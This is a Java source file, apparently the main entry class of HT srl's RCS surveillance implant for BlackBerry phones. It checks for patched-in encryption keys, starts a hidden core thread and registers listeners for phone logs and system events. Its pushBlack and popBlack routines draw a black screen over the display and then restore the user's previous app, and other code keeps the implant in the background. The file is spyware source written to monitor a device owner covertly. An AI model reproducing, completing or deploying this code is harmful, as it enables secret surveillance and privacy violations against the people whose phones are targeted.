//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry
 * File         : Main.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry;

import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
import net.rim.device.api.system.Alert;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.Dialog;
import blackberry.config.Cfg;
import blackberry.config.Keys;
import blackberry.crypto.Encryption;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.InjectorManager;
import blackberry.utils.Utils;

/**
 * The Class Main.
 */

public class Main extends UiApplication {
    //#ifdef DEBUG
    private final Debug debug;
    //#endif

    AppListener appListener;

    private boolean acceptsForeground;
    private int foregroundId;

    private BlackScreen blackScreen;

    private static LocalScreen localScreen;
    private static Main instance;

    //private boolean foreground;

    /**
     * The main method.
     * 
     * @param args
     *            the arguments
     */
    public static void main(final String[] args) {
        //#ifdef TEST
        System.out.println("Test");
        new MainTest();

        //#else
        mainReal();
        //#endif       

    }

    public static void mainReal() {
        final Keys keys = Encryption.getKeys();
        final boolean binaryPatched = keys.hasBeenBinaryPatched();

        if (binaryPatched) {
            instance = new Main();
            Status.self().setMain(instance);
            instance.enterEventDispatcher();
            
        } else {
            //#ifdef DEBUG
            System.out.println("Not binary patched, bailing out!");
            //#endif
        }
    }

    public static Main getInstance() {
        return Status.self().getMain();
    }

    /**
     * Instantiates a new main.
     */
    public Main() {
        localScreen = new LocalScreen(this);
        pushScreen(localScreen);

        final Core core = Core.getInstance();

        Thread.currentThread().setPriority(Thread.MIN_PRIORITY);
        appListener = AppListener.getInstance();

        //#ifdef DEBUG
        debug = new Debug("Main", DebugLevel.VERBOSE);
        debug.info("RCSBlackBerry " + Version.VERSION);
        debug.info("Message encryption: " + Messages.getString("1.0"));
        debug.info("BuildID = " + new String(Keys.getInstance().getBuildID()));
        debug.info("Key Conf = " + Utils.byteArrayToHex(Keys.getInstance().getConfKey()));
        debug.info("Key Log = " + Utils.byteArrayToHex(Keys.getInstance().getLogKey()));
        debug.info("Key Proto = " + Utils.byteArrayToHex(Keys.getInstance().getProtoKey()));
        debug.info("Demo = " + Utils.byteArrayToHex(Keys.getInstance().getDemo()));
        debug.info("Random = " + Utils.byteArrayToHex(Keys.getInstance().getRandomSeed()));
        //#endif

        final Thread coreThread = new Thread(core);
        coreThread.setPriority(Thread.MIN_PRIORITY);
        coreThread.start();

        startListeners();

        if (Keys.getInstance().isDemo()) {
            //#ifdef DEBUG
            debug.warn("Main: DEMO mode");
            //#endif
            Status.self().setDemo(true);
        } else {
            //#ifdef DEBUG
            debug.trace("Main: no DEMO");
            //#endif
            Status.self().setDemo(false);
        }
        //#ifdef DEBUG
        Status.self().setDebug(true);
        //#endif

        if (Status.self().isDemo()) {
            short[] fire = { 1400, 15, 1350, 15, 1320, 20, 1300, 20, 1250, 25,
                    1200, 35, 1200, 15, 1250, 15, 1300, 20, 1320, 20, 1350, 25,
                    1400, 35 };
            try {
                Alert.startAudio(fire, 100);
                UiApplication.getUiApplication().invokeAndWait(new Runnable() {
                    public void run() {
                        Dialog.alert(Messages.getString("C.2"));
                    }
                });
               
            } catch (Exception e) {

            }
        }

    }

    /**
     * 
     */
    public void startListeners() {
        //#ifdef DEBUG
        debug.info("Starting Listeners");
        //#endif

        //Phone.addPhoneListener(appListener);
        addHolsterListener(appListener);
        addSystemListener(appListener);
        //addRadioListener(appListener);
        //MemoryCleanerDaemon.addListener(appListener);

        //addRadioListener(appListener);
        PhoneLogs.addListener(appListener);

        Task.getInstance().resumeApplicationTimer();

        //goBackground();
    }

    /**
     * 
     */
    public void stopListeners() {
        //#ifdef DEBUG
        debug.info("Stopping Listeners");
        //#endif

        removeHolsterListener(appListener);
        removeSystemListener(appListener);
        removeRadioListener(appListener);
        //MemoryCleanerDaemon.removeListener(appListener);

        //Phone.removePhoneListener(appListener);
        PhoneLogs.removeListener(appListener);

        Task.getInstance().suspendApplicationTimer();
        //goBackground();
    }

    public boolean acceptsForeground() {
        return acceptsForeground;
    }

    public void pushBlack() {
        //#ifdef DEBUG
        debug.trace("pushBlack");
        //#endif

        Thread thread = new Thread(new Runnable() {

            public void run() {
                ApplicationManager manager = ApplicationManager
                        .getApplicationManager();
                foregroundId = manager.getForegroundProcessId();

                blackScreen = new BlackScreen();
                acceptsForeground = true;
                synchronized (getAppEventLock()) {
                    pushScreen(blackScreen);
                }

                requestForeground();
            }
        });
        thread.start();

    }

    public void popBlack() {
        //#ifdef DEBUG
        debug.trace("popBlack");
        //#endif

        Thread thread = new Thread(new Runnable() {

            public void run() {

                requestBackground();
                acceptsForeground = false;

                synchronized (getAppEventLock()) {
                    //#ifdef DEBUG
                    debug.trace("popBlack: " + getActiveScreen());
                    //#endif
                    Screen screen = getActiveScreen();
                    if (screen instanceof BlackScreen) {
                        popScreen(blackScreen);
                    }

                }
                ApplicationManager.getApplicationManager().requestForeground(
                        foregroundId);
            };
        });
        thread.start();
    }

    public void activate() {
        //#ifdef DEBUG
        debug.trace("activate");
        //#endif
    }

    public void deactivate() {
        //#ifdef DEBUG
        debug.trace("deactivate");
        //#endif
    }

    public void goBackground() {
        //#ifdef DEBUG
        debug.trace("goBackground");
        //#endif

        if (!Cfg.IS_UI) {
            return;
        }

        invokeLater(new Runnable() {
            public void run() {

                boolean foreground = false;
                UiApplication.getUiApplication().requestBackground();
                foreground = UiApplication.getUiApplication().isForeground();

                //#ifdef DEBUG
                debug.trace("Main foreground: " + foreground);
                //#endif
            }
        });
    }

    public LocalScreen getLocalScreen() {        
        return localScreen;
    }
}
